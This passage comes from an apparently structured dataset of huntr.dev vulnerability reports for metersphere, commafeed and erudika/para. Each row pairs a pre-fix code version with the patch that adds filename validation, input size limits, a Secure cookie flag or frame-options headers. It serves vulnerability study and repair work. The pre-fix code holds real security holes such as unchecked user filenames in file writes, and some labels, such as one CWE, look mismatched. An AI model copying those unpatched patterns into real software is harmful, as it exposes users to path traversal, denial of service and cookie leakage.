            MSException.throwException(Translator.get(""invalid_parameter""));
        }
    }

    public static byte[] listBytesToZip(Map<String, byte[]> mapReport) {
        try {
@@ -55,6 +60,7 @@ public static byte[] listBytesToZip(Map<String, byte[]> mapReport) {
    }

    public static void createFile(String filePath, byte[] fileBytes) {
        validateFileName(filePath);
        File file = new File(filePath);
        if (file.exists()) {
            file.delete();
@@ -93,6 +99,7 @@ private static void create(List<String> bodyUploadIds, List<MultipartFile> bodyF
            }
            for (int i = 0; i < bodyUploadIds.size(); i++) {
                MultipartFile item = bodyFiles.get(i);
                validateFileName(item.getOriginalFilename());
                File file = new File(filePath + File.separator + bodyUploadIds.get(i) + ""_"" + item.getOriginalFilename());
                try (InputStream in = item.getInputStream(); OutputStream out = new FileOutputStream(file)) {
                    file.createNewFile();
@@ -112,6 +119,7 @@ private static void create(List<String> bodyUploadIds, List<MultipartFile> bodyF
    public static String create(String id, MultipartFile item) {
        String filePath = BODY_FILE_DIR + ""/plugin"";
        if (item != null) {
            validateFileName(item.getOriginalFilename());
            File testDir = new File(filePath);
            if (!testDir.exists()) {
                testDir.mkdirs();
@@ -141,6 +149,7 @@ public static void createBodyFiles(String requestId, List<MultipartFile> bodyFil
                testDir.mkdirs();
            }
            bodyFiles.forEach(item -> {
                validateFileName(item.getOriginalFilename());
                File file = new File(path + File.separator + item.getOriginalFilename());
                try (InputStream in = item.getInputStream(); OutputStream out = new FileOutputStream(file)) {
                    file.createNewFile();
@@ -259,6 +268,7 @@ public static void createFiles(List<String> bodyUploadIds, List<MultipartFile> b
    }

    public static String createFile(MultipartFile bodyFile) {
        validateFileName(bodyFile.getOriginalFilename());
        String dir = ""/opt/metersphere/data/body/tmp/"";
        File fileDir = new File(dir);
        if (!fileDir.exists()) {
@@ -290,6 +300,7 @@ public static void deleteBodyFiles(String requestId) {
    }

    public static String uploadFile(MultipartFile uploadFile, String path, String name) {
        validateFileName(name);
        if (uploadFile == null) {
            return null;
        }
5
.../sdk-parent/sdk/src/main/java/io/metersphere/metadata/repository/LocalFileRepository.java
@@ -127,12 +127,13 @@ public List<FileInfoDTO> getFileBatch(List<FileRequest> requestList) throws Exce


    private File createFile(FileRequest request) {
        String path = StringUtils.join(FileUtils.BODY_FILE_DIR, ""/"", request.getProjectId());
        FileUtils.validateFileName(request.getFileName());
        String path = StringUtils.join(FileUtils.BODY_FILE_DIR, File.separator, request.getProjectId());
        File fileDir = new File(path);
        if (!fileDir.exists()) {
            fileDir.mkdirs();
        }
        File file = new File(StringUtils.join(path, ""/"", request.getFileName()));
        File file = new File(StringUtils.join(path, File.separator, request.getFileName()));
        return file;
    }
}"
https://huntr.dev/bounties/9ec0d8d9-0311-45b8-adaf-37fe80461dcb/,Improper Input Validation in athou/commafeed,"Input validation is a frequently-used technique for checking potentially dangerous inputs in order to ensure that the inputs are safe for processing within the code, or when communicating with other components. When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow. There's no bound limit set on the number of characters/special characters in the name field of catagory, which potentially allows bulk inputs to surge on the demo version.",,CWE-20: Improper Input Validation,https://www.github.com/athou/commafeed/commit/fe875666688395b34d2867b26f1efd9a3c6ddd93,"@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,9 +15,12 @@
public class AddCategoryRequest implements Serializable {

 @ApiModelProperty(value = ""name"", required = true)


 private String name;

 @ApiModelProperty(value = ""parent category id, if any"")

 private String parentId;

}
@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,12 +15,15 @@
public class CategoryModificationRequest implements Serializable {

 @ApiModelProperty(value = ""id"", required = true)

 private Long id;

 @ApiModelProperty(value = ""new name, null if not changed"")

 private String name;

 @ApiModelProperty(value = ""new parent category id"")

 private String parentId;

 @ApiModelProperty(value = ""new display position, null if not changed"")

@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,6 +15,8 @@
public class FeedInfoRequest implements Serializable {

 @ApiModelProperty(value = ""feed url"", required = true)


 private String url;

}
@@ -2,6 +2,8 @@

import java.io.Serializable;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,15 +17,18 @@ public class FeedModificationRequest implements Serializable {
 private Long id;

 @ApiModelProperty(value = ""new name, null if not changed"")

 private String name;

 @ApiModelProperty(value = ""new parent category id"")

 private String categoryId;

 @ApiModelProperty(value = ""new display position, null if not changed"")
 private Integer position;

 @ApiModelProperty(value = ""JEXL string evaluated on new entries to mark them as read if they do not match"")

 private String filter;

}
@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,8 +15,11 @@
public class LoginRequest implements Serializable {

 @ApiModelProperty(value = ""username"", required = true)

 private String name;

 @ApiModelProperty(value = ""password"", required = true)


 private String password;
}
@@ -3,6 +3,9 @@
import java.io.Serializable;
import java.util.List;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -13,6 +16,8 @@
public class MarkRequest implements Serializable {

 @ApiModelProperty(value = ""entry id, category id, 'all' or 'starred'"", required = true)


 private String id;

 @ApiModelProperty(value = ""mark as read or unread"", required = true)
@@ -24,6 +29,7 @@ public class MarkRequest implements Serializable {
 private Long olderThan;

 @ApiModelProperty(value = ""only mark read if a feed has these keywords in the title or rss content"", required = false)

 private String keywords;

 @ApiModelProperty(value = ""if marking a category or 'all', exclude those subscriptions from the marking"", required = false)

@@ -3,6 +3,8 @@
import java.io.Serializable;
import java.util.List;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -13,6 +15,6 @@
public class MultipleMarkRequest implements Serializable {

 @ApiModelProperty(value = ""list of mark requests"", required = true)
 private List<MarkRequest> requests;

}
@@ -4,6 +4,7 @@

import javax.validation.constraints.Email;
import javax.validation.constraints.NotEmpty;


import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
@@ -17,5 +18,6 @@ public class PasswordResetRequest implements Serializable {
 @ApiModelProperty(value = ""email address for password recovery"", required = true)
 @Email
 @NotEmpty

 private String email;
}
@@ -2,6 +2,9 @@

import java.io.Serializable;




import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
@@ -13,9 +16,12 @@
@Data
public class ProfileModificationRequest implements Serializable {
 @ApiModelProperty(value = ""current user password, required to change profile data"", required = true)


 private String currentPassword;

 @ApiModelProperty(value = ""changes email of the user, if specified"")

 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")

@@ -4,8 +4,7 @@

import javax.validation.constraints.Email;
import javax.validation.constraints.NotEmpty;

import org.hibernate.validator.constraints.Length;

import com.commafeed.frontend.auth.ValidPassword;

@@ -19,18 +18,19 @@
public class RegistrationRequest implements Serializable {

 @ApiModelProperty(value = ""username, between 3 and 32 characters"", required = true)
 @Length(min = 3, max = 32)
 @NotEmpty

 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @ValidPassword
 @NotEmpty

 private String password;

 @ApiModelProperty(value = ""email address for password recovery"", required = true)
 @Email
 @NotEmpty

 private String email;

}
@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,6 +15,8 @@
public class StarRequest implements Serializable {

 @ApiModelProperty(value = ""id"", required = true)


 private String id;

 @ApiModelProperty(value = ""feed id"", required = true)

@@ -2,6 +2,9 @@

import java.io.Serializable;




import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,12 +15,17 @@
public class SubscribeRequest implements Serializable {

 @ApiModelProperty(value = ""url of the feed"", required = true)


 private String url;

 @ApiModelProperty(value = ""name of the feed for the user"", required = true)


 private String title;

 @ApiModelProperty(value = ""id of the user category to place the feed in"")

 private String categoryId;

}
@@ -14,6 +14,7 @@

import javax.inject.Inject;
import javax.inject.Singleton;

import javax.ws.rs.Consumes;
import javax.ws.rs.DefaultValue;
import javax.ws.rs.GET;
@@ -244,7 +245,7 @@ public Response getCategoryEntriesAsFeed(@ApiParam(hidden = true) @SecurityCheck
 @ApiOperation(value = ""Mark category entries"", notes = ""Mark feed entries of this category as read"")
 @Timed
 public Response markCategoryEntries(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""category id, or 'all'"", required = true) MarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());

@@ -285,7 +286,8 @@ private void removeExcludedSubscriptions(List<FeedSubscription> subs, List<Long>
 @UnitOfWork
 @ApiOperation(value = ""Add a category"", notes = ""Add a new feed category"", response = Long.class)
 @Timed
 public Response addCategory(@ApiParam(hidden = true) @SecurityCheck User user, @ApiParam(required = true) AddCategoryRequest req) {

  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getName());

@@ -343,7 +345,7 @@ public Response deleteCategory(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Rename a category"", notes = ""Rename an existing feed category"")
 @Timed
 public Response modifyCategory(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) CategoryModificationRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());


@@ -4,6 +4,7 @@

import javax.inject.Inject;
import javax.inject.Singleton;

import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
@@ -48,7 +49,7 @@ public class EntryREST {
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response markEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Mark Request"", required = true) MarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());

@@ -62,7 +63,7 @@ public Response markEntry(@ApiParam(hidden = true) @SecurityCheck User user,
 @ApiOperation(value = ""Mark multiple feed entries"", notes = ""Mark feed entries as read/unread"")
 @Timed
 public Response markEntries(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Multiple Mark Request"", required = true) MultipleMarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getRequests());

@@ -79,7 +80,7 @@ public Response markEntries(@ApiParam(hidden = true) @SecurityCheck User user,
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response starEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Star Request"", required = true) StarRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());
  Preconditions.checkNotNull(req.getFeedId());
@@ -105,7 +106,7 @@ public Response getTags(@ApiParam(hidden = true) @SecurityCheck User user) {
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response tagEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Tag Request"", required = true) TagRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getEntryId());


","6
src/main/java/com/commafeed/frontend/model/request/AddCategoryRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,9 +15,12 @@
public class AddCategoryRequest implements Serializable {

 @ApiModelProperty(value = ""name"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String name;

 @ApiModelProperty(value = ""parent category id, if any"")
 @Size(max = 128)
 private String parentId;

}
6
src/main/java/com/commafeed/frontend/model/request/CategoryModificationRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,12 +15,15 @@
public class CategoryModificationRequest implements Serializable {

 @ApiModelProperty(value = ""id"", required = true)
 @NotEmpty
 private Long id;

 @ApiModelProperty(value = ""new name, null if not changed"")
 @Size(max = 128)
 private String name;

 @ApiModelProperty(value = ""new parent category id"")
 @Size(max = 128)
 private String parentId;

 @ApiModelProperty(value = ""new display position, null if not changed"")
5
src/main/java/com/commafeed/frontend/model/request/FeedInfoRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,6 +15,8 @@
public class FeedInfoRequest implements Serializable {

 @ApiModelProperty(value = ""feed url"", required = true)
 @NotEmpty
 @Size(max = 4096)
 private String url;

}
21
src/main/java/com/commafeed/frontend/model/request/FeedMergeRequest.java
Load diff
This file was deleted.
5
src/main/java/com/commafeed/frontend/model/request/FeedModificationRequest.java
@@ -2,6 +2,8 @@

import java.io.Serializable;

import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,15 +17,18 @@ public class FeedModificationRequest implements Serializable {
 private Long id;

 @ApiModelProperty(value = ""new name, null if not changed"")
 @Size(max = 128)
 private String name;

 @ApiModelProperty(value = ""new parent category id"")
 @Size(max = 128)
 private String categoryId;

 @ApiModelProperty(value = ""new display position, null if not changed"")
 private Integer position;

 @ApiModelProperty(value = ""JEXL string evaluated on new entries to mark them as read if they do not match"")
 @Size(max = 4096)
 private String filter;

}
6
src/main/java/com/commafeed/frontend/model/request/LoginRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,8 +15,11 @@
public class LoginRequest implements Serializable {

 @ApiModelProperty(value = ""username"", required = true)
 @Size(min = 3, max = 32)
 private String name;

 @ApiModelProperty(value = ""password"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String password;
}
6
src/main/java/com/commafeed/frontend/model/request/MarkRequest.java
@@ -3,6 +3,9 @@
import java.io.Serializable;
import java.util.List;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -13,6 +16,8 @@
public class MarkRequest implements Serializable {

 @ApiModelProperty(value = ""entry id, category id, 'all' or 'starred'"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String id;

 @ApiModelProperty(value = ""mark as read or unread"", required = true)
@@ -24,6 +29,7 @@ public class MarkRequest implements Serializable {
 private Long olderThan;

 @ApiModelProperty(value = ""only mark read if a feed has these keywords in the title or rss content"", required = false)
 @Size(max = 128)
 private String keywords;

 @ApiModelProperty(value = ""if marking a category or 'all', exclude those subscriptions from the marking"", required = false)
4
src/main/java/com/commafeed/frontend/model/request/MultipleMarkRequest.java
@@ -3,6 +3,8 @@
import java.io.Serializable;
import java.util.List;

import javax.validation.Valid;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -13,6 +15,6 @@
public class MultipleMarkRequest implements Serializable {

 @ApiModelProperty(value = ""list of mark requests"", required = true)
 private List<MarkRequest> requests;
 private List<@Valid MarkRequest> requests;

}
2
src/main/java/com/commafeed/frontend/model/request/PasswordResetRequest.java
@@ -4,6 +4,7 @@

import javax.validation.constraints.Email;
import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
@@ -17,5 +18,6 @@ public class PasswordResetRequest implements Serializable {
 @ApiModelProperty(value = ""email address for password recovery"", required = true)
 @Email
 @NotEmpty
 @Size(max = 255)
 private String email;
}
6
src/main/java/com/commafeed/frontend/model/request/ProfileModificationRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import com.commafeed.frontend.auth.ValidPassword;

import io.swagger.annotations.ApiModel;
@@ -13,9 +16,12 @@
@Data
public class ProfileModificationRequest implements Serializable {
 @ApiModelProperty(value = ""current user password, required to change profile data"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String currentPassword;

 @ApiModelProperty(value = ""changes email of the user, if specified"")
 @Size(max = 255)
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")
8
src/main/java/com/commafeed/frontend/model/request/RegistrationRequest.java
@@ -4,8 +4,7 @@

import javax.validation.constraints.Email;
import javax.validation.constraints.NotEmpty;

import org.hibernate.validator.constraints.Length;
import javax.validation.constraints.Size;

import com.commafeed.frontend.auth.ValidPassword;

@@ -19,18 +18,19 @@
public class RegistrationRequest implements Serializable {

 @ApiModelProperty(value = ""username, between 3 and 32 characters"", required = true)
 @Length(min = 3, max = 32)
 @NotEmpty
 @Size(min = 3, max = 32)
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @ValidPassword
 @NotEmpty
 @ValidPassword
 private String password;

 @ApiModelProperty(value = ""email address for password recovery"", required = true)
 @Email
 @NotEmpty
 @Size(max = 255)
 private String email;

}
5
src/main/java/com/commafeed/frontend/model/request/StarRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,6 +15,8 @@
public class StarRequest implements Serializable {

 @ApiModelProperty(value = ""id"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String id;

 @ApiModelProperty(value = ""feed id"", required = true)
8
src/main/java/com/commafeed/frontend/model/request/SubscribeRequest.java
@@ -2,6 +2,9 @@

import java.io.Serializable;

import javax.validation.constraints.NotEmpty;
import javax.validation.constraints.Size;

import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -12,12 +15,17 @@
public class SubscribeRequest implements Serializable {

 @ApiModelProperty(value = ""url of the feed"", required = true)
 @NotEmpty
 @Size(max = 4096)
 private String url;

 @ApiModelProperty(value = ""name of the feed for the user"", required = true)
 @NotEmpty
 @Size(max = 128)
 private String title;

 @ApiModelProperty(value = ""id of the user category to place the feed in"")
 @Size(max = 128)
 private String categoryId;

}
8
src/main/java/com/commafeed/frontend/resource/CategoryREST.java
@@ -14,6 +14,7 @@

import javax.inject.Inject;
import javax.inject.Singleton;
import javax.validation.Valid;
import javax.ws.rs.Consumes;
import javax.ws.rs.DefaultValue;
import javax.ws.rs.GET;
@@ -244,7 +245,7 @@ public Response getCategoryEntriesAsFeed(@ApiParam(hidden = true) @SecurityCheck
 @ApiOperation(value = ""Mark category entries"", notes = ""Mark feed entries of this category as read"")
 @Timed
 public Response markCategoryEntries(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""category id, or 'all'"", required = true) MarkRequest req) {
   @Valid @ApiParam(value = ""category id, or 'all'"", required = true) MarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());

@@ -285,7 +286,8 @@ private void removeExcludedSubscriptions(List<FeedSubscription> subs, List<Long>
 @UnitOfWork
 @ApiOperation(value = ""Add a category"", notes = ""Add a new feed category"", response = Long.class)
 @Timed
 public Response addCategory(@ApiParam(hidden = true) @SecurityCheck User user, @ApiParam(required = true) AddCategoryRequest req) {
 public Response addCategory(@ApiParam(hidden = true) @SecurityCheck User user,
   @Valid @ApiParam(required = true) AddCategoryRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getName());

@@ -343,7 +345,7 @@ public Response deleteCategory(@ApiParam(hidden = true) @SecurityCheck User user
 @ApiOperation(value = ""Rename a category"", notes = ""Rename an existing feed category"")
 @Timed
 public Response modifyCategory(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(required = true) CategoryModificationRequest req) {
   @Valid @ApiParam(required = true) CategoryModificationRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());

9
src/main/java/com/commafeed/frontend/resource/EntryREST.java
@@ -4,6 +4,7 @@

import javax.inject.Inject;
import javax.inject.Singleton;
import javax.validation.Valid;
import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
@@ -48,7 +49,7 @@ public class EntryREST {
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response markEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Mark Request"", required = true) MarkRequest req) {
   @Valid @ApiParam(value = ""Mark Request"", required = true) MarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());

@@ -62,7 +63,7 @@ public Response markEntry(@ApiParam(hidden = true) @SecurityCheck User user,
 @ApiOperation(value = ""Mark multiple feed entries"", notes = ""Mark feed entries as read/unread"")
 @Timed
 public Response markEntries(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Multiple Mark Request"", required = true) MultipleMarkRequest req) {
   @Valid @ApiParam(value = ""Multiple Mark Request"", required = true) MultipleMarkRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getRequests());

@@ -79,7 +80,7 @@ public Response markEntries(@ApiParam(hidden = true) @SecurityCheck User user,
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response starEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Star Request"", required = true) StarRequest req) {
   @Valid @ApiParam(value = ""Star Request"", required = true) StarRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getId());
  Preconditions.checkNotNull(req.getFeedId());
@@ -105,7 +106,7 @@ public Response getTags(@ApiParam(hidden = true) @SecurityCheck User user) {
 @ApiOperation(value = ""Mark a feed entry"", notes = ""Mark a feed entry as read/unread"")
 @Timed
 public Response tagEntry(@ApiParam(hidden = true) @SecurityCheck User user,
   @ApiParam(value = ""Tag Request"", required = true) TagRequest req) {
   @Valid @ApiParam(value = ""Tag Request"", required = true) TagRequest req) {
  Preconditions.checkNotNull(req);
  Preconditions.checkNotNull(req.getEntryId());"
https://huntr.dev/bounties/c1ce598d-aa94-47cc-9d88-6b6d2846b8ea/,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute in erudika/para,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.",,CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,https://www.github.com/erudika/para/commit/02ee9e4d53cb653255de9acd216ebe3bf44675ca,"@@ -926,8 +926,8 @@ public void addDatatype(String pluralDatatype, String datatype) {
   return;
  }
  if (getDatatypes().size() >= Para.getConfig().maxDatatypesPerApp()) {
   LoggerFactory.getLogger(App.class).warn(""Maximum number of types per app reached - {}."",
     Para.getConfig().maxDatatypesPerApp());
   return;
  }
  if (!getDatatypes().containsKey(pluralDatatype) && !getDatatypes().containsValue(datatype) &&

@@ -18,6 +18,7 @@
package com.erudika.para.server.utils;

import com.erudika.para.core.utils.Para;

import java.util.TimeZone;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
@@ -160,6 +161,9 @@ public static void setAuthCookie(String name, String value, int maxAge,
  sb.append(""Expires="").append(expires).append("";"");
  sb.append(""Max-Age="").append(maxAge).append("";"");
  sb.append(""HttpOnly;"");



  sb.append(""SameSite=Lax"");
  response.addHeader(javax.ws.rs.core.HttpHeaders.SET_COOKIE, sb.toString());
 }

","4
para-core/src/main/java/com/erudika/para/core/App.java
@@ -926,8 +926,8 @@ public void addDatatype(String pluralDatatype, String datatype) {
   return;
  }
  if (getDatatypes().size() >= Para.getConfig().maxDatatypesPerApp()) {
   LoggerFactory.getLogger(App.class).warn(""Maximum number of types per app reached - {}."",
     Para.getConfig().maxDatatypesPerApp());
   LoggerFactory.getLogger(App.class).warn(""Maximum number of types per app reached ({}) for app {}."",
     Para.getConfig().maxDatatypesPerApp(), getAppIdentifier());
   return;
  }
  if (!getDatatypes().containsKey(pluralDatatype) && !getDatatypes().containsValue(datatype) &&
4
para-server/src/main/java/com/erudika/para/server/utils/HttpUtils.java
@@ -18,6 +18,7 @@
package com.erudika.para.server.utils;

import com.erudika.para.core.utils.Para;
import com.erudika.para.server.security.SecurityUtils;
import java.util.TimeZone;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
@@ -160,6 +161,9 @@ public static void setAuthCookie(String name, String value, int maxAge,
  sb.append(""Expires="").append(expires).append("";"");
  sb.append(""Max-Age="").append(maxAge).append("";"");
  sb.append(""HttpOnly;"");
  if (StringUtils.startsWithIgnoreCase(SecurityUtils.getRedirectUrl(request), ""https://"") || request.isSecure()) {
   sb.append(""Secure;"");
  }
  sb.append(""SameSite=Lax"");
  response.addHeader(javax.ws.rs.core.HttpHeaders.SET_COOKIE, sb.toString());
 }"
https://huntr.dev/bounties/0cb65f0f-0389-400c-87fd-3a91f64b12c8/,UI REDRESSING in athou/commafeed,"The web application does not restrict or incorrectly restricts frame objects or UI layers that belong to another application or domain, which can lead to user confusion about which interface the user is interacting with.",,CWE-1021: Improper Restriction of Rendered UI Layers or Frames,https://www.github.com/athou/commafeed/commit/a48135a60dccd40cc47ce5277ddb2d65d7487010,"@@ -316,6 +316,11 @@
   <groupId>io.dropwizard.metrics</groupId>
   <artifactId>metrics-json</artifactId>
  </dependency>






  <dependency>
   <groupId>javax.xml.bind</groupId>

@@ -61,6 +61,8 @@
import io.dropwizard.servlets.CacheBustingFilter;
import io.dropwizard.setup.Bootstrap;
import io.dropwizard.setup.Environment;



public class CommaFeedApplication extends Application<CommaFeedConfiguration> {

@@ -96,6 +98,15 @@ public DataSourceFactory getDataSourceFactory(CommaFeedConfiguration configurati
   }
  });










  bootstrap.addBundle(new AssetsBundle(""/assets/"", ""/"", ""index.html""));
  bootstrap.addBundle(new MultiPartBundle());
 }

","5
pom.xml
@@ -316,6 +316,11 @@
   <groupId>io.dropwizard.metrics</groupId>
   <artifactId>metrics-json</artifactId>
  </dependency>
  <dependency>
   <groupId>io.dropwizard.modules</groupId>
   <artifactId>dropwizard-web</artifactId>
   <version>1.5.0</version>
  </dependency>

  <dependency>
   <groupId>javax.xml.bind</groupId>
11
src/main/java/com/commafeed/CommaFeedApplication.java
@@ -61,6 +61,8 @@
import io.dropwizard.servlets.CacheBustingFilter;
import io.dropwizard.setup.Bootstrap;
import io.dropwizard.setup.Environment;
import io.dropwizard.web.WebBundle;
import io.dropwizard.web.conf.WebConfiguration;

public class CommaFeedApplication extends Application<CommaFeedConfiguration> {

@@ -96,6 +98,15 @@ public DataSourceFactory getDataSourceFactory(CommaFeedConfiguration configurati
   }
  });

  bootstrap.addBundle(new WebBundle<CommaFeedConfiguration>() {
   @Override
   public WebConfiguration getWebConfiguration(CommaFeedConfiguration configuration) {
    WebConfiguration config = new WebConfiguration();
    config.getFrameOptionsHeaderFactory().setEnabled(true);
    return config;
   }
  });

  bootstrap.addBundle(new AssetsBundle(""/assets/"", ""/"", ""index.html""));
  bootstrap.addBundle(new MultiPartBundle());
 }"
https://huntr.dev/bounties/d515dce8-065c-4514-9445-fce301e1176b/,Allows large characters in change password in athou/commafeed,"The commafeedapplication allows large characters to insert in the input field ""password"" at password change feature which can allow attackers to cause a Denial of Service (DoS) via a crafted HTTP request.",,CWE-191: Integer Underflow (Wrap or Wraparound),https://www.github.com/athou/commafeed/commit/899a8d746a7a7740c48e948c914e642de0712680,"@@ -409,6 +409,11 @@
    </exclusion>
   </exclusions>
  </dependency>






  <dependency>
   <groupId>redis.clients</groupId>

@@ -92,19 +92,9 @@ public User register(String name, String password, String email, Collection<Role

 public User register(String name, String password, String email, Collection<Role> roles, boolean forceRegistration) {

  Preconditions.checkNotNull(name);
  Preconditions.checkArgument(StringUtils.length(name) <= 32, ""Name too long (32 characters maximum)"");
  Preconditions.checkNotNull(password);

  if (!forceRegistration) {
   Preconditions.checkState(config.getApplicationSettings().getAllowRegistrations(),
     ""Registrations are closed on this CommaFeed instance"");

   Preconditions.checkNotNull(email);
   Preconditions.checkArgument(StringUtils.length(name) >= 3, ""Name too short (3 characters minimum)"");
   Preconditions.checkArgument(forceRegistration || StringUtils.length(password) >= 6,
     ""Password too short (6 characters maximum)"");
   Preconditions.checkArgument(StringUtils.contains(email, ""@""), ""Invalid email address"");
  }

  Preconditions.checkArgument(userDAO.findByName(name) == null, ""Name already taken"");

@@ -0,0 +1,54 @@






















































@@ -0,0 +1,23 @@























@@ -2,6 +2,8 @@

import java.io.Serializable;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -15,6 +17,7 @@ public class ProfileModificationRequest implements Serializable {
 private String email;

 @ApiModelProperty(value = ""changes password of the user, if specified"")

 private String password;

 @ApiModelProperty(value = ""generate a new api key"")

@@ -6,6 +6,8 @@
import org.hibernate.validator.constraints.Length;
import org.hibernate.validator.constraints.NotEmpty;



import io.swagger.annotations.ApiModel;
import io.swagger.annotations.ApiModelProperty;
import lombok.Data;
@@ -21,7 +23,7 @@ public class RegistrationRequest implements Serializable {
 private String name;

 @ApiModelProperty(value = ""password, minimum 6 characters"", required = true)
 @Length(min = 6)
 @NotEmpty
